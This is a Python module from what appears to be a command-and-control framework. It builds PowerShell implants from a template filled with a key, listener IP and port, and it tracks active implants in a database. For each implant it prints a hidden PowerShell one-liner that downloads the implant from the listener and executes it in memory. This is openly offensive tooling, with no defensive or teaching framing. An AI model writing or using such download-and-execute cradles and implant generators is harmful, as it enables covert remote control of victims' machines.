from tabulate import tabulate
from time import sleep
import base64
import os
import shutil


from Core import listener,color,database




def create_powershell(conn,implant_name,key,listener_name,listener_ip,listener_port):

	powershell_implant = open("Implants/powershell.ps1", "r").read().replace("REPLACE_KEY",key).replace("REPLACE_IP",listener_ip).replace("REPLACE_PORT",str(listener_port)).replace("REPLACE_NAME",implant_name)


	with open("data/implant/%s/host.ps1" % implant_name, "w") as f:
		f.write(powershell_implant)


	database.rec_implant(conn,implant_name,key,listener_name,listener_ip,listener_port)

	print ("[%s] %s implant is ready." % (color.green("+"),implant_name))

	print ("powershell.exe -nop -w hidden -c \"IEX(New-Object Net.WebClient).DownloadString('http://%s:%s/down/%s/host.ps1')\"" % (listener_ip,listener_port,implant_name))



def GenerateImplant(conn,command):

	try:
		command = command.split()
		listener_name = command[2]
		implant_lang = command[3]
		implant_name = command[4]
		key = base64.b64encode(os.urandom(32)).decode()


		results = database.return_key(conn,implant_name)


		if not results:

			results = database.return_token(conn,listener_name)

			listener_ip = results[0][1]
			listener_port = results[0][2]

			try:
				if os.path.isdir('data'):
					if os.path.isdir('data/implant'):
						pass
					else:
						os.mkdir("implant")

				else:
					os.mkdir("data")
					os.mkdir("data/implant")

				os.mkdir("data/implant/%s" % implant_name)
			except:

				shutil.rmtree("data/implant/%s/" % implant_name)
				os.mkdir("data/implant/%s" % implant_name)

			if implant_lang == "powershell":

				create_powershell(conn,implant_name,key,listener_name,listener_ip,listener_port)

			else:

				print ("[%s] Go Implant is underdeveloped!" % color.red("-"))


		else:

			print ("[%s] %s Implant found!!" % (color.red("-"),implant_name))
			ask = input("[%s] Do you want remove it (Y)? " % color.cyan('*')).lower()

			if ask == "y":

				StopImplant(conn,implant_name)

	except ValueError:

		print ("[%s] There an error found!!" % color.red("-"))
		print (ValueError)

def StopImplant(conn,name):

	try:

		database.Delete_Active_Implant(conn,name)
		return True

	except:

		print ("[%s] There is an error." % color.red("-"))


def ListImplant(conn):

	results = database.list_implant(conn)

	data = []

	for i in range(0,len(results)):

		data.append([results[i][0]])

	print ("\n",tabulate(data, headers=["Active Implants"]),"\n")
